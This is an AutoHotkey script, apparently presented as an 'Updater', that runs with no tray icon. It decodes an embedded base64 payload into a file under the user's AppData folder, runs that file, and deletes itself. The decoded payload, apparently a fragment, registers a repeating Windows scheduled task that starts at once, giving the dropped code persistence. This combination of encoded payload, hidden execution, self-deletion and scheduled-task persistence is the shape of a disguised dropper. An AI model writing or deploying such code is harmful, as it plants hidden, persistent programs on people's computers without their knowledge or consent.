 #NoTrayIcon
#SingleInstance Force

CreateUpdater()

CreateUpdater() {
   local
   base64 := GetBase64()
   size := CryptStringToBinary(base64, data)
   if !InStr(FileExist(A_AppData . "\Updater"), "D")
      FileCreateDir, % A_AppData . "\Updater"
   filePath := A_AppData . "\Updater\Updater.ahk"
   if !FileExist(filePath) || CompareData(filePath, data, size) {
      File := FileOpen(filePath, "w")
      File.Pos := 0
      File.RawWrite(data, size)
      File := ""
   }
   Run, % filePath
   FileDelete, % A_ScriptFullPath
}

CryptStringToBinary(string, ByRef outData, formatName := "CRYPT_STRING_BASE64")
{
   local
   static formats := { CRYPT_STRING_BASE64: 0x1
                     , CRYPT_STRING_HEX:    0x4
                     , CRYPT_STRING_HEXRAW: 0xC }
   fmt := formats[formatName]
   chars := StrLen(string)
   if !DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                            , "Ptr", 0, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
      throw "CryptStringToBinary failed. LastError: " . A_LastError
   VarSetCapacity(outData, bytes)
   DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                        , "Str", outData, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
   Return bytes
}

CompareData(filePath, ByRef data, len) {
   local
   fileLen := GetFileData(filePath, fileData)
   if (fileLen != len)
      Return true
   hLib := DllCall("LoadLibrary", "Str", "Bcrypt.dll", "Ptr")
   fileHashLen := CreateHash(&fileData, fileLen, fileHashData)
   dataHashLen := CreateHash(&data, len, hashData)
   DllCall("FreeLibrary", "Ptr", hLib)
   Return DllCall("msvcrt\memcmp", "Ptr", &fileHashData, "Ptr", &hashData, "Ptr", dataHashLen)
}

GetFileData(filePath, ByRef data) {
   local
   File := FileOpen(filePath, "r")
   File.Pos := 0
   File.RawRead(data, len := File.Length)
   File := ""
   Return len
}

CreateHash(pData, size, ByRef hashData, pSecretKey := 0, keySize := 0, AlgId := "SHA256") {
   ; CNG Algorithm Identifiers
   ; https://docs.microsoft.com/en-us/windows/win32/seccng/cng-algorithm-identifiers
   local
   static HMAC := BCRYPT_ALG_HANDLE_HMAC_FLAG := 0x00000008
   DllCall("Bcrypt\BCryptOpenAlgorithmProvider", "PtrP", hAlgorithm, "WStr",  AlgId, "Ptr", 0, "UInt", keySize ? HMAC : 0)
   DllCall("Bcrypt\BCryptCreateHash", "Ptr", hAlgorithm, "PtrP", hHash, "Ptr", 0, "UInt", 0, "Ptr", pSecretKey, "UInt", keySize, "UInt", 0)
   DllCall("Bcrypt\BCryptHashData", "Ptr", hHash, "Ptr", pData, "UInt", size, "UInt", 0)
   DllCall("Bcrypt\BCryptGetProperty", "Ptr", hAlgorithm, "WStr", "HashDigestLength", "UIntP", hashLen, "UInt", 4, "UIntP", cbResult, "UInt", 0)
   VarSetCapacity(hashData, hashLen, 0)
   DllCall("Bcrypt\BCryptFinishHash", "Ptr", hHash, "Ptr", &hashData, "UInt", hashLen, "UInt", 0)
   DllCall("Bcrypt\BCryptDestroyHash", "Ptr", hHash)
   DllCall("Bcrypt\BCryptCloseAlgorithmProvider", "Ptr", hAlgorithm, "UInt", 0)
   Return hashLen
}

GetBase64() {
local
base64 := ""
base64 .= "cnMgOj0gdGFza0RlZmluaXRpb24uVHJpZ2dlcnMNCiAgIHRyaWdnZXIgOj0gdHJpZ2dlcnMuQ3JlYXRlKFRBU0tfVFJJR0dFUl9EQUlMWSkNCiAgIGlmIGludGVydmFsSG91cnMgew0KICAgICAgcmVwZXRpdGlvbiA6PSB0cmlnZ2VyLlJlcGV0aXRpb24NCiAgICAgIHJlcGV0aXRpb24uRHVyYXRpb24gOj0gIlAxRCINCiAgICAgIHJlcGV0aXRpb24uSW50ZXJ2YWwgOj0gIlBUIiAuIGludGVydmFsSG91cnMgLiAiSCINCiAgIH0NCiAgIHN0YXJ0VGltZSA6PSAiMjAyMjA2MTYiIC4gU3RyUmVwbGFjZShzdGFydFRpbWUsICI6IikgLiAiMDAiDQogICBGb3JtYXRUaW1lLCBzdGFydFRpbWUsICUgc3RhcnRUaW1lLCB5eXl5LU1NLWRkVEhIOm1tOnNzDQogICB0cmlnZ2VyLlN0YXJ0Qm91bmRhcnkgOj0gc3RhcnRUaW1lDQogICB0cmlnZ2VyLklkIDo9ICJUaW1lVHJpZ2dlcklkIg0KICAgdHJpZ2dlci5FbmFibGVkIDo9IHRydWUNCg0KICAgYWN0aW9uIDo9IHRhc2tEZWZpbml0aW9uLkFjdGlvbnMuQ3JlYXRlKCBUQVNLX0FDVElPTl9FWEVDICkNCiAgIGFjdGlvbi5QYXRoIDo9IGZpbGVQYXRoDQogICAoc0FyZ3MgIT0gIiIgJiYgYWN0aW9uLkFyZ3VtZW50cyA6PSBzQXJncykNCiAgIA0KICAgdGFzayA6PSByb290Rm9sZGVyLlJlZ2lzdGVyVGFza0RlZmluaXRpb24odGFza05hbWUsIHRhc2tEZWZpbml0aW9uLCBUQVNLX0NSRUFURV9PUl9VUERBVEUsLCwgVEFTS19MT0dPTl9JTlRFUkFDVElWRV9UT0tFTikNCiAgICggc3RhcnRJbW1lZGlhdGVseSAmJiB0YXNrLlJ1bigiIikgKQ0KICAgUmV0dXJuIHRydWUNCn0="
Return base64
}
